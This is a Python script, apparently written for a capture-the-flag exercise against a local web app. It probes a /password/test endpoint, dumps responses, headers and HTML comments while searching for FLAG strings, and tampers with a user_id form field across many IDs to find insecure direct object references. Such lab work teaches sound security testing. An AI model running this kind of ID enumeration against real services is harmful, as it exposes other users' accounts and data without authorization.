import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"

print("[*] Carefully examining /password/test endpoint responses\n")

# Test 1: GET request to /password/test
print("[TEST 1] GET /password/test - Check for hidden data")
resp = requests.get(PASSWORD_TEST_URL)
print(f"Status: {resp.status_code}")
print(f"Length: {len(resp.text)}B")
print(f"\n[+] Full HTML response:")
print(resp.text)
print(f"\n{'='*60}\n")

# Check for FLAG
flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
if flag_match:
    print(f"[!] FLAG FOUND in GET response: {flag_match.group(0)}\n")

# Check for comments or hidden fields
comments = re.findall(r'<!--.*?-->', resp.text, re.DOTALL)
if comments:
    print(f"[+] HTML Comments found:")
    for comment in comments:
        print(f"  {comment}")

# Check headers
print(f"\n[+] Response headers:")
for header, value in resp.headers.items():
    print(f"  {header}: {value}")

print(f"\n{'='*60}\n")

# Test 2: POST request and check immediate response before redirect
print("[TEST 2] POST to /password/test - Check response body before redirect")
auth_data = {
    'username': 'test',
    'password': 'test',
    'user_id': '10032'
}

post_resp = requests.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=False)
print(f"Status: {post_resp.status_code}")
print(f"Headers: {dict(post_resp.headers)}")
print(f"Body length: {len(post_resp.text)}B")
print(f"\n[+] Full response body:")
print(post_resp.text)

# Check for FLAG
flag_match = re.search(r'FLAG\{[^}]+\}', post_resp.text)
if flag_match:
    print(f"\n[!] FLAG FOUND in POST response: {flag_match.group(0)}")

print(f"\n{'='*60}\n")

# Test 3: Try POST with various user_id values and check response bodies
print("[TEST 3] POST with different user_ids - Look for response variations")

test_ids = [1, 2, 5, 10, 100, 1000, 9999, 10000, 10001, 10031, 10032, 10033, 10034, 50000, 99999]

responses_by_size = {}

for user_id in test_ids:
    auth_data = {
        'username': 'test',
        'password': 'test',
        'user_id': str(user_id)
    }
    
    post_resp = requests.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=False)
    
    response_size = len(post_resp.text)
    
    if response_size not in responses_by_size:
        responses_by_size[response_size] = []
    
    responses_by_size[response_size].append({
        'user_id': user_id,
        'status': post_resp.status_code,
        'location': post_resp.headers.get('Location', 'N/A'),
        'body': post_resp.text
    })

print(f"[+] Response size distribution:")
for size, resp_list in sorted(responses_by_size.items()):
    print(f"\n  Size {size}B: {len(resp_list)} responses")
    for resp_info in resp_list[:3]:  # Show first 3
        print(f"    user_id={resp_info['user_id']}: Status {resp_info['status']}, Location: {resp_info['location']}")
    
    # If unique response size, print full body
    if len(resp_list) == 1:
        print(f"  [+] Unique response - Full body:")
        print(f"  {resp_list[0]['body']}")
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', resp_list[0]['body'])
        if flag_match:
            print(f"\n  [!] FLAG FOUND: {flag_match.group(0)}")

